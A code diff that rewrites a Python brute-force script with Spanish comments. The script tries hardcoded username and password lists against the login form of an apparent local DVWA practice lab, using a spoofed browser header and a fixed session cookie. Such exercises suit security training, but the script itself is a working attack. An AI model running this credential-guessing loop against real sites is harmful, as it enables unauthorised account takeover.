@@ -1,40 +1,41 @@
 import requests
 
-#funcion para importar nombres y contraseñas
-def read_file(nombre_archivo):
-    with open(nombre_archivo, 'r') as archivo:
-        return [linea.strip() for linea in archivo]
+def brute_force_login(url, usernames, passwords):
+    valid_credentials = []
+    
+    for username in usernames:
+        for password in passwords:
+            payload = {
+                'username': username,
+                'password': password,
+                'Login': 'Login'
+            }
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
+                'Referer': 'http://localhost:8081/vulnerabilities/brute/',
+                'Cookie': 'PHPSESSID=7b1uu8mbj6s0cgi6lfk1jt8q53; security=low'
+            }
+            response = requests.get(url, params=payload, headers=headers)
+            
+            if "Username and/or password incorrect" not in response.text:
+                valid_credentials.append((username, password))
+                print(f"Credenciales válidas encontradas: {username}:{password}")
+    
+    return valid_credentials
 
-#Primero importamos la url de la página web
-#Es un localhost asi que nos conectamos al mismo
-url = 'localhost:8081/vulnerabilities/brute/'
+# URL del formulario de inicio de sesión
+url = 'http://localhost:8081/vulnerabilities/brute/'
 
-#users.txt
-usuario = read_file('users.txt')
-#passwords.txt
-contrasena = read_file ('passwords.txt')
+# Listas de nombres de usuario y contraseñas a probar
+usernames = ['admin', '1337', 'diego', 'pablo', 'gordonb', 'smithy']
+passwords = ['password','abc123' ,'password344' ,'charley' , 'qwerty', 'letmein']
 
-def try_login(url, usuario, contrasena):
-    datos = {
-        'user': usuario,
-        'password': contrasena
-    }
-    try:
-        respuesta = requests.post(url, data=datos)
-        return respuesta.status_code == 200 and "Login exitoso" in respuesta.text
-    except requests.RequestException:
-        return False
+print("Iniciando ataque de fuerza bruta...")
+valid_credentials = brute_force_login(url, usernames, passwords)
 
-#counter de combinaciones exitosas
-combinaciones_exitosas = []
-
-#logica del inicio de sesion
-for i in usuario:
-    for j in contrasena:
-        if try_login(url, i, j):
-            combinaciones_exitosas.append((i,j))
-            print(f"Éxito: Usuario '{usuario}' con contraseña '{contrasena}'")
-
-print(f"Combinaciones exitosas encontradas: {len(combinaciones_exitosas)}")
-for usuario, contrasena in combinaciones_exitosas:
-    print(f"- Usuario: {usuario}, Contraseña: {contrasena}")
+if valid_credentials:
+    print("\nTodas las combinaciones válidas encontradas:")
+    for username, password in valid_credentials:
+        print(f"Usuario: {username}, Contraseña: {password}")
+else:
+    print("No se encontraron credenciales válidas.")
